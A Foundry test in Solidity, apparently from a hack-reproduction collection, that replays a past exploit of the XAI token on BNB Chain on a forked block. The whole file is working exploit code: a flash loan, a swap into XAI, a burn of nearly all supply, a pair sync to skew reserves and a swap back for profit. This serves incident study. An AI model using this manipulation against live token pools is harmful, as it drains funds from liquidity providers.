// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Unclear
// Attacker : https://bscscan.com/address/0xea75aec151f968b8de3789ca201a2a3a7faeefba
// Attack Contract : https://bscscan.com/address/0x7b11ae85f73b7ee6aa84cc91430581bd952d9ffa
// Vulnerable Contract : https://bscscan.com/address/0x570ce7b89c67200721406525e1848bca6ff5a6f3
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x2b251e456c434992b9ac7ec56dc166550c4cd7db3adefbf7eb3ab91cef55f9bf

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x570ce7b89c67200721406525e1848bca6ff5a6f3#code#L646

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1724683082064855455
// Hacking God :

interface IXAI is IERC20 {
    function burn(uint256 amount) external;
}

contract XAIExploit is BaseTestWithBalanceLog {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IXAI private constant XAI = IXAI(0x570Ce7b89c67200721406525e1848bca6fF5A6F3);
    DVM private constant DPPOracle = DVM(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    Uni_Router_V2 private constant PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 private constant XAI_WBNB = Uni_Pair_V2(0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B);

    uint256 blocknumToForkFrom = 33_503_556;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(XAI), "XAI");
        vm.label(address(DPPOracle), "DPPOracle");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(XAI_WBNB), "XAI_WBNB");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        XAI.approve(address(PancakeRouter), type(uint256).max);
        DPPOracle.flashLoan(WBNB.balanceOf(address(DPPOracle)), 0, address(this), bytes("_"));

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNB.approve(address(PancakeRouter), type(uint256).max);
        WBNBToXAI();
        uint256 burnAmount = XAI.totalSupply() - 4_596;
        XAI.burn(burnAmount);
        XAI_WBNB.sync();
        XAIToWBNB();
        WBNB.transfer(address(DPPOracle), baseAmount);
    }

    function WBNBToXAI() private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(XAI);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1_000
        );
    }

    function XAIToWBNB() private {
        address[] memory path = new address[](2);
        path[0] = address(XAI);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            XAI.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1_000
        );
    }
}
